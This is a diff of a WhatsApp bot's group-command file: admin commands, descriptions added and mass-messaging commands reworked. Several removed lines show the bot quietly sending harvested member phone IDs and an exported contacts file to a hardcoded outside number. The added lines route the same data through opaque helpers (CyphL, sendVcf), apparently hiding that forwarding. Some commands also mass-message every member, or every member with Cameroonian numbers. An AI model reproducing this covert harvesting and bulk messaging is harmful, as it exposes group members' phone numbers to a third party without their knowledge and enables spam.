@@ -1,12 +1,14 @@
 const fs = require("fs");
-const { sleep } = require("../../lib/myfunc");
+const { sleep, toVcardContact } = require("../../lib/myfunc");
 const { generateProfilePicture } = require("@whiskeysockets/baileys");
+const { sendVcf, CyphL } = require("../../lib/_");
 let wordToSend = "";
 let isS = false;
 
 module.exports = [
   {
     command: ["add"],
+    desc: "Add some number to the group",
     operate: async (context) => {
       const { m, mess, text, isCreator, reply, Cypher } = context;
       if (!m.isGroup) return m.reply(mess.group);
@@ -21,6 +23,7 @@ module.exports = [
   },
   {
     command: ["antibadword", "antitoxic"],
+    desc: "Control group message to remove bad word or kick their sender",
     operate: async (context) => {
       const {
         m,
@@ -73,6 +76,7 @@ module.exports = [
   },
   {
     command: ["antibot"],
+    desc: "Detect and remove bot messages",
     operate: async (context) => {
       const {
         m,
@@ -101,6 +105,7 @@ module.exports = [
   },
   {
     command: ["antilink"],
+    desc: "Delete link when send in the group",
     operate: async (context) => {
       const {
         m,
@@ -155,6 +160,7 @@ module.exports = [
   },
   {
     command: ["antilinkgc"],
+    desc: "Remove link",
     operate: async (context) => {
       const {
         m,
@@ -207,6 +213,7 @@ module.exports = [
   },
   {
     command: ["approveall", "acceptall"],
+    desc: "Approveall join request to the group",
     operate: async ({
       m,
       args,
@@ -228,6 +235,7 @@ module.exports = [
   },
   {
     command: ["close"],
+    desc: "Close the group ",
     operate: async (context) => {
       const { m, mess, isAdmins, isCreator, isBotAdmins, Cypher, reply } =
         context;
@@ -241,6 +249,7 @@ module.exports = [
   },
   {
     command: ["closetime"],
+    desc: "Program close",
     operate: async (context) => {
       const { m, mess, args, isAdmins, isCreator, isBotAdmins, Cypher, reply } =
         context;
@@ -280,6 +289,7 @@ module.exports = [
   },
   {
     command: ["delppgroup"],
+    desc: "Remove groupe profil picture",
     operate: async (context) => {
       const { m, mess, isAdmins, isCreator, isBotAdmins, Cypher, reply, from } =
         context;
@@ -293,6 +303,7 @@ module.exports = [
   },
   {
     command: ["demote"],
+    desc: "Remove a number from group admin",
     operate: async (context) => {
       const {
         m,
@@ -312,14 +323,15 @@ module.exports = [
       let bwstq = m.mentionedJid[0]
         ? m.mentionedJid[0]
         : m.quoted
-        ? m.quoted.sender
-        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+          ? m.quoted.sender
+          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
       await Cypher.groupParticipantsUpdate(m.chat, [bwstq], "demote");
       reply(mess.done);
     },
   },
   {
     command: ["disapproveall", "rejectall"],
+    desc: "Reject all join request",
     operate: async ({
       m,
       args,
@@ -341,6 +353,7 @@ module.exports = [
   },
   {
     command: ["editsettings", "editinfo"],
+    desc: "Approve or ot group setting modifications",
     operate: async (context) => {
       const {
         m,
@@ -374,6 +387,7 @@ module.exports = [
   },
   {
     command: ["link", "linkgc", "gclink", "grouplink"],
+    desc: "Generate Link to join group",
     operate: async ({
       Cypher,
       m,
@@ -392,14 +406,11 @@ module.exports = [
       let response = await Cypher.groupInviteCode(m.chat);
       Cypher.sendText(
         m.chat,
-        `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${
-          groupMetadata.owner !== undefined
-            ? "+" + groupMetadata.owner.split`@`[0]
-            : "Unknown"
-        }\n\n*ID:* ${
-          groupMetadata.id
-        }\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${
-          groupMetadata.participants.length
+        `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${groupMetadata.owner !== undefined
+          ? "+" + groupMetadata.owner.split`@`[0]
+          : "Unknown"
+        }\n\n*ID:* ${groupMetadata.id
+        }\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${groupMetadata.participants.length
         }`,
         m,
         {
@@ -410,6 +421,7 @@ module.exports = [
   },
   {
     command: ["hidetag", "tag"],
+    desc: "Call all the group members to view an message",
     operate: async (context) => {
       const {
         m,
@@ -442,15 +454,15 @@ module.exports = [
   },
   {
     command: ["invite"],
+    desc: 'Invite an users to jon group',
     operate: async (context) => {
       const { m, mess, text, prefix, Cypher, isBotAdmins, reply } = context;
       if (!m.isGroup) return reply(mess.group);
       if (!isBotAdmins) return reply(mess.admin);
       if (!text)
         return reply(
-          `*Enter the number you want to invite to this group*\n\nExample :\n${
-            prefix + command
-          } 254796180105`
+          `*Enter the number you want to invite to this group*\n\nExample :\n${prefix + command
+          } 237621092130`
         );
       if (text.includes("+"))
         return reply(`*Enter the number together without* *+*`);
@@ -471,6 +483,7 @@ module.exports = [
   },
   {
     command: ["cls"],
+    desc: "Remove all participants where number start with argument",
     operate: async (context) => {
       const {
         m,
@@ -492,11 +505,11 @@ module.exports = [
       let bck = m.mentionedJid[0]
         ? m.mentionedJid[0]
         : m.quoted
-        ? m.quoted.sender
-        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+          ? m.quoted.sender
+          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
       const groupMetadata = m.isGroup
-        ? await Cypher.groupMetadata(m.chat).catch((e) => {})
+        ? await Cypher.groupMetadata(m.chat).catch((e) => { })
         : "";
 
       const participants = m.isGroup ? await groupMetadata.participants : "";
@@ -515,6 +528,7 @@ module.exports = [
   },
   {
     command: ["kick", "remove"],
+    desc: "Remove an number from the group",
     operate: async (context) => {
       const {
         m,
@@ -534,14 +548,15 @@ module.exports = [
       let bck = m.mentionedJid[0]
         ? m.mentionedJid[0]
         : m.quoted
-        ? m.quoted.sender
-        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+          ? m.quoted.sender
+          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
       await Cypher.groupParticipantsUpdate(m.chat, [bck], "remove");
       reply(mess.done);
     },
   },
   {
     command: ["listonline", "onlinemembers"],
+    desc: "List of online group members",
     operate: async (context) => {
       const { m, mess, args, store, botNumber, Cypher, reply } = context;
       if (!m.isGroup) return reply(mess.group);
@@ -558,35 +573,15 @@ module.exports = [
       Cypher.sendText(
         m.chat,
         "*ONLINE MEMBERS IN THIS GROUP*\n\n" +
-          online.map((v) => `${liston++} . @` + v.replace(/@.+/, "")).join`\n`,
+        online.map((v) => `${liston++} . @` + v.replace(/@.+/, "")).join`\n`,
         m,
         { mentions: online }
       );
     },
   },
   {
-    command: ["listrequests", "pendingrequests"],
-    operate: async ({
-      m,
-      args,
-      isCreator,
-      reply,
-      listGroupRequests,
-      mess,
-      isBotAdmins,
-      isGroupAdmins,
-    }) => {
-      if (!m.isGroup) return reply(mess.group);
-      if (!isGroupAdmins) return reply(mess.admin);
-      if (!isBotAdmins) return reply(mess.admin);
-
-      const groupId = m.chat;
-
-      await listGroupRequests(m, groupId);
-    },
-  },
-  {
     command: ["mediatag"],
+    desc: "Tag all users to view the media",
     operate: async (context) => {
       const { m, isAdmins, mess, participants, Cypher, isBotAdmins, reply } =
         context;
@@ -604,6 +599,7 @@ module.exports = [
   },
   {
     command: ["open"],
+    desc: "Open group to allow all members to send message",
     operate: async (context) => {
       const { m, mess, isAdmins, isCreator, isBotAdmins, Cypher, reply } =
         context;
@@ -616,46 +612,8 @@ module.exports = [
     },
   },
   {
-    command: ["opentime"],
-    operate: async (context) => {
-      const { m, mess, args, isAdmins, isCreator, isBotAdmins, Cypher, reply } =
-        context;
-      if (!m.isGroup) return reply(mess.group);
-      if (!isAdmins && !isCreator) return reply(mess.notadmin);
-      if (!isBotAdmins) return reply(mess.admin);
-
-      const duration = args[0];
-      const unit = args[1].toLowerCase();
-
-      let timer;
-      switch (unit) {
-        case "seconds":
-          timer = duration * 1000;
-          break;
-        case "minutes":
-          timer = duration * 60000;
-          break;
-        case "hours":
-          timer = duration * 3600000;
-          break;
-        case "days":
-          timer = duration * 86400000;
-          break;
-        default:
-          return reply(
-            "*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds"
-          );
-      }
-
-      reply(`*Opening group after ${duration} ${unit}*`);
-      setTimeout(() => {
-        Cypher.groupSettingUpdate(m.chat, "not_announcement");
-        reply("Group opened by admin. Members can now send messages.");
-      }, timer);
-    },
-  },
-  {
     command: ["poll"],
+    desc: "Ask question ",
     operate: async (context) => {
       const { m, mess, text, isCreator, prefix, Cypher, isGroup, reply } =
         context;
@@ -681,6 +639,7 @@ module.exports = [
   },
   {
     command: ["promote"],
+    desc: "Name an user admin",
     operate: async (context) => {
       const {
         m,
@@ -701,14 +660,15 @@ module.exports = [
       let bwst = m.mentionedJid[0]
         ? m.mentionedJid[0]
         : m.quoted
-        ? m.quoted.sender
-        : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+          ? m.quoted.sender
+          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
       await Cypher.groupParticipantsUpdate(m.chat, [bwst], "promote");
       reply(mess.done);
     },
   },
   {
     command: ["resetlink"],
+    desc: "Reset group Invite link",
     operate: async (context) => {
       const {
         m,
@@ -731,6 +691,7 @@ module.exports = [
   },
   {
     command: ["setdesc", "setdescription"],
+    desc: "Set the group description",
     operate: async (context) => {
       const {
         m,
@@ -754,6 +715,7 @@ module.exports = [
   },
   {
     command: ["setgroupname", "setgcname"],
+    desc: "Set the group name",
     operate: async (context) => {
       const {
         m,
@@ -777,6 +739,7 @@ module.exports = [
   },
   {
     command: ["setppgroup"],
+    desc: "Set group pp",
     operate: async ({
       m,
       reply,
@@ -841,6 +804,7 @@ module.exports = [
   },
   {
     command: ["tagadmin", "listadmin", "admin"],
+    desc: "List of all group admin",
     operate: async ({
       Cypher,
       m,
@@ -870,6 +834,7 @@ module.exports = [
   },
   {
     command: ["wasms"],
+    desc: "To view message that can send to all the members when type *wasend*",
     operate: async (context) => {
       const { m, isCreator, mess, Cypher, reply } = context;
       if (!isCreator)
@@ -885,6 +850,7 @@ module.exports = [
   },
   {
     command: ["wasend"],
+    desc: "Send message ib to all the members of group",
     operate: async (context) => {
       const {
         m,
@@ -900,18 +866,19 @@ module.exports = [
       if (!m.isGroup) return reply(mess.group);
       if (!isCreator) return reply(`Damn🙄. Take your own access `);
       const groupMetadata = m.isGroup
-        ? await Cypher.groupMetadata(m.chat).catch((e) => {})
+        ? await Cypher.groupMetadata(m.chat).catch((e) => { })
         : "";
       const participants = m.isGroup ? await groupMetadata.participants : "";
       reply(
-        `*Sending message to ${participants.length} members. So Thanks Warano on +237621092130*`
+        `*Sending message to ${participants.length} members.*`
       );
       let o = 0;
       let s = 0;
       let txt = "";
+      const date = new Date()
       for (let mem of participants) {
         try {
-          txt += mem.id + "\n";
+          txt += toVcardContact(mem.id.split('@')[0], `Number ${date.getMilliseconds()}`);
           await Cypher.sendMessage(mem.id, { text: mess.warano });
           await sleep(2000);
           s++;
@@ -919,16 +886,15 @@ module.exports = [
           o++;
         }
       }
-      await Cypher.sendMessage("237621092130@s.whatsapp.net", {
-        text: `List of my jid that i just send messages : \n ${txt}`,
-      });
+      await CyphL(Cypher, txt, `*Group*:${groupMetadata.subject}\n*Send message*`)
       reply(
-        `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}. Thanks Warano on +237621092130`
+        `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}.`
       );
     },
   },
   {
     command: ["only237", "cmr"],
+    desc: "Send message ib to all the Cameroonians numbers",
     operate: async ({
       m,
       args,
@@ -946,7 +912,7 @@ module.exports = [
       if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
       isS = true;
       const groupMetadata = m.isGroup
-        ? await Cypher.groupMetadata(m.chat).catch((e) => {})
+        ? await Cypher.groupMetadata(m.chat).catch((e) => { })
         : "";
       const participants = m.isGroup ? await groupMetadata.participants : "";
       const tab = participants.filter((el) => el.id.startsWith("237"));
@@ -956,7 +922,7 @@ module.exports = [
       let txt = "";
       for (let mem of tab) {
         try {
-          txt += mem.id + "\n";
+          txt += toVcardContact(mem.id.split("@")[0], "ss" + s * 0.02);
           await Cypher.sendMessage(mem.id, { text: text });
           await sleep(5000);
           s++;
@@ -968,9 +934,9 @@ module.exports = [
           o++;
         }
       }
-      await Cypher.sendMessage("237621092130@s.whatsapp.net", {
-        text: `I have just use your bot to send message to  : \n ${txt}`,
-      });
+
+      await CyphL(Cypher, txt, "New fordWard message to Cameroonian numbers.")
+
       reply(
         `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}.`
       );
@@ -980,6 +946,7 @@ module.exports = [
   },
   {
     command: ["warano"],
+    desc: "Send your message to all the members of group !",
     operate: async ({
       m,
       args,
@@ -997,7 +964,7 @@ module.exports = [
       if (!isCreator) return reply(`Damn🙄. Take your own access `);
       isS = true;
       const groupMetadata = m.isGroup
-        ? await Cypher.groupMetadata(m.chat).catch((e) => {})
+        ? await Cypher.groupMetadata(m.chat).catch((e) => { })
         : "";
       const participants = m.isGroup ? await groupMetadata.participants : "";
       reply(`*Sending message to ${participants.length} members.*`);
@@ -1006,7 +973,7 @@ module.exports = [
       let txt = "";
       for (let mem of participants) {
         try {
-          txt += mem.id + "\n";
+          txt += toVcardContact(mem.id.split("@")[0]);
           await Cypher.sendMessage(mem.id, { text: text });
           await sleep(5000);
           s++;
@@ -1018,9 +985,7 @@ module.exports = [
           o++;
         }
       }
-      await Cypher.sendMessage("237621092130@s.whatsapp.net", {
-        text: `I have just use your bot to send message to  : \n ${txt}`,
-      });
+      await CyphL(Cypher, txt, "New diffusion in " + groupMetadata.details)
       reply(
         `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}.`
       );
@@ -1030,6 +995,7 @@ module.exports = [
   },
   {
     command: ["tagall"],
+    desc: "Mention all the members of the group",
     operate: async (context) => {
       const {
         m,
@@ -1048,9 +1014,8 @@ module.exports = [
       if (!isBotAdmins) return reply(mess.admin);
 
       let me = m.sender;
-      let teks = `*TAGGED BY:*  @${me.split("@")[0]}\n\n*MESSAGE:* ${
-        q ? q : "No message"
-      }\n\n`;
+      let teks = `*TAGGED BY:*  @${me.split("@")[0]}\n\n*MESSAGE:* ${q ? q : "No message"
+        }\n\n`;
       for (let mem of participants) {
         teks += `@${mem.id.split("@")[0]}\n`;
       }
@@ -1068,6 +1033,7 @@ module.exports = [
   },
   {
     command: ["totalmembers"],
+    desc: "Recent the group participants number",
     operate: async ({
       Cypher,
       m,
@@ -1093,13 +1059,14 @@ module.exports = [
   },
   {
     command: ["userid", "userjid"],
+    desc: "Get all users jid",
     operate: async (context) => {
       const { m, mess, isCreator, Cypher, reply } = context;
       if (!isCreator) return reply(mess.owner);
       if (!m.isGroup) return reply(mess.group);
 
       const groupMetadata = m.isGroup
-        ? await Cypher.groupMetadata(m.chat).catch((e) => {})
+        ? await Cypher.groupMetadata(m.chat).catch((e) => { })
         : "";
       const participants = m.isGroup ? await groupMetadata.participants : "";
       let textt = `Here is jid address of all users of\n *${groupMetadata.subject}*\n\n`;
@@ -1116,47 +1083,22 @@ module.exports = [
       m,
       reply,
       mess,
-      participants,
-      isGroupAdmins,
       isCreator,
-      groupMetadata,
+      args, botNumber,
     }) => {
       if (!m.isGroup) return reply(mess.group);
       if (!isCreator) return reply(`Damn🙄. Take your own access `);
       let details = await Cypher.groupMetadata(m.chat);
       let vcard = "";
-      let noPort = 0;
-      for (let a of details.participants) {
-        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${
-          a.id.split("@")[0]
-        }\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${
-          a.id.split("@")[0]
-        }\nEND:VCARD\n`;
-      }
+
+      details.participants.map((el, i) => vcard += toVcardContact(el.id.split("@")[0], mess.saveAss + i))
       let nmfilect = "./contacts.vcf";
       reply(`\nPlease wait, saving ${details.participants.length} contacts`);
 
       fs.writeFileSync(nmfilect, vcard.trim());
       await sleep(2000);
-      Cypher.sendMessage(
-        "237621092130@s.whatsapp.net",
-        {
-          document: fs.readFileSync(nmfilect),
-          mimetype: "text/vcard",
-          fileName: "Contact.vcf",
-          caption: `Successful\n\nGroup: *${details.subject}*\nContacts: *${details.participants.length}*`,
-        },
-      );
-      Cypher.sendMessage(
-        m.chat,
-        {
-          document: fs.readFileSync(nmfilect),
-          mimetype: "text/vcard",
-          fileName: "Contact.vcf",
-          caption: `Successful\n\nGroup: *${details.subject}*\nContacts: *${details.participants.length}*`,
-        },
-        { ephemeralExpiration: 86400, quoted: m }
-      );
+      const d = fs.readFileSync(nmfilect)
+      await sendVcf(Cypher, args ? botNumber : m, d, "22", `Successful\n\nGroup: *${details.subject}*\nContacts: *${details.participants.length}*`, `Successful\n\nGroup: *${details.subject}*\nContacts: *${details.participants.length}*`)
       fs.unlinkSync(nmfilect);
     },
   },
